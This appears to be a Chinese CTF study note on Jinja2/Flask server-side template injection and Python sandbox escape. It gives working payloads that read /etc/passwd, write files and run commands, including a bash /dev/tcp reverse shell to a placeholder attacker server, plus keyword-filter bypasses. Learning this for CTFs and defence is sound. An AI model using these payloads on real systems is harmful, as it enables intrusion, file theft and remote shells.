---
title: "SSTI" 
weight: 9
bookToc: true
---

## SSTI

SSTI = Server Side Template Injection。模版主要用于web开发中，帮助开发者将业务逻辑（如数据处理）与表现层（如页面布局）分离。当模版可控时从而引发代码注入。

主要模版引擎：
- python：jinja2、 mako、 tornado、 django
- php：smarty、 twig
- java：jade、 velocity

ctf web题目中主要考查的是python语言的SSTI，其他语言也有，但涉及的知识点可能没有python的复杂。

下面主要以python + flask（模版引擎为jinja2）来介绍，在正式介绍前，也展开说一下相关背景知识点

## jinja2 SSTI原理

SSTI与`render_template_string()`函数密不可分，如以下例子

```python
@app.route('/test')
def test():
    html = '{{12*12}}'
    return flask.render_template_string(html)
```

发现`{{ ... }}` 中的 `12*12` 被执行了；如果我们传入的参数可控，则有可能改变原有程序逻辑，实现任意代码执行。

## 沙箱逃逸

python沙箱逃逸就是在在一个严格限制的python环境中，通过绕过限制达到执行更高权限，甚至getshell的过程。

ctf web题目中最终的目的一般是执行命令或者读取文件：
- 可执行命令的模块有：`os`/`pty`/`subprocess`/`platfor`/`commands`
- 可读取文件的模块有：`file`/`open`/`codecs`/`fileinput`，`file`只能在python2中执行

思路是通过一些内建的魔术方法/属性寻找可以利用的类，相关魔术方法用：
- `__class__`: 返回对象所属的类
- `__init__`: 类的初始化方法
- `__bases__`/`__mro__`: 返回所有父类
- `__subclasses__()`: 返回所有子类
- `__globals__`: 返回全局变量字典
- `__builtins__`: 

payload如下（Python2环境下）：
```python
# 读文件
''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
object.__subclasses__()[40]('/etc/passwd').read()

# 写文件
''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil.txt', 'w').write('evil code')

# 执行命令
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('bash -i >& /dev/tcp/你的服务器地址/端口 0>&1').read()
__import__('o'+'s').system('who'+'ami')
__builtins__.__dict__['__imp'+'ort__']('os').system('whoami')
```

flask 自带的一些变量，以及绕过
```
{{ config }}
{{ request.environ }}

# 过滤了小括号
{{ url_for.__globals__ }}
{{ url_for.__globals__['current_app'].config['FLAG'] }}

{{ get_flashed_messages.__globals__['current_app'].config['FLAG'] }}


# 过滤了 class、 subclasses、 read等关键词
{{''[request.args.a][request.args.b][2][request.args.c]()}}?a=__class__&b=__mro__&c=__subclasses__


# 过滤_ 本质变成了 {{request|attr("__class__")}} 即 {{request.__class__}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

# 绕过join，用format
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

## 题目

{{< expand "题目 攻防世界-Web-Web_python_template_injection" "..." >}}
TODO
{{< /expand >}}


## Tplmap

https://github.com/epinna/tplmap
